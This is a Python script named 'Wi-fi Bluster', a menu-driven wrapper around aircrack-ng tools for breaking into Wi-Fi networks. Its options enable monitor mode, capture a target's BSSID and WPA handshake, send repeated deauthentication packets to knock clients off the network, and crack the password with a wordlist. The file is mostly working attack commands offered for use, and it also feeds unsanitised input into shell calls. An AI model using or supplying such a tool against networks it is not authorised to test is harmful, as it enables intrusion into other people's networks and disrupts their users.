#!/usr/bin/python3

# module import
import time
import pyfiglet
import datetime
from os import system
from termcolor import colored
import os.path

system('clear')  # clears the screen
print('-' * 60)
scanit = colored(pyfiglet.figlet_format("Wi-fi  Bluster"), 'cyan')
for i in scanit:
    print(i, end='')
    time.sleep(.001)

print('-' * 60)
date = datetime.datetime.now()
print("date", date.date())
print("time", date.time())
print('-' * 60, "\n")

print("""Enter Your Choice:

1. Set monitor mode
2. Capture Bssid and channel
3. capture cap file
4. De-auth pack (Run this seperatly to get hand shake))
5. Crack the password

""")

try:
    a = int(input("Enter here: "))
    NetI = input("Enter adapter name here: ")
    if a == 1:
        system('airmon-ng check kill')
        system(f'ifconfig {NetI} down && iwconfig {NetI} mode Monitor && ifconfig {NetI} up')
        print("Monitor Mode enabled please confirm manualy on another tab.")
        time.sleep(5)
        system("sudo ./main.py")
    if a == 2:
        system('rm dump-01.*')
        system(f'sudo airodump-ng {NetI} -w dump')
        system('sudo ./main.py')
    if a == 3:
        system('rm abc-01.*')
        system('cat dump-01.csv')
        print("Now open new tab and run option 4 there after start running option 3")
        bssid = input("Enter bssid: ")
        channel = int(input("Enter channel number: "))
        system(f"airodump-ng --bssid {bssid} --channel {channel} --write abc {NetI}")
    if a == 4:
        system('cat abc-01.csv')
        bssid = input("Enter bssid: ")
        station = input("Enter Station ID: ")
        system(f"aireplay-ng --deauth 10 -a {bssid} -c {station} {NetI}")
        print("Do u want to de-auth again:")
        ans = input("Enter here: ")
        if ans == 'yes' or ans == 'y' or ans == 'Y' or ans == 'YES':
            system(f"aireplay-ng --deauth 10 -a {bssid} -c {station} {NetI}")
        system('sudo ./main.py')
    if a == 5:
        word = input("Enter Path of wordlist: ")
        system(f"aircrack-ng -w {word} abc-01.cap")
        print("""

        Hope you got the password if not try step 4 agian.
        Thank you for using Wifi-Bluster
        """)
except:
    print("Unexpected Error Occured")
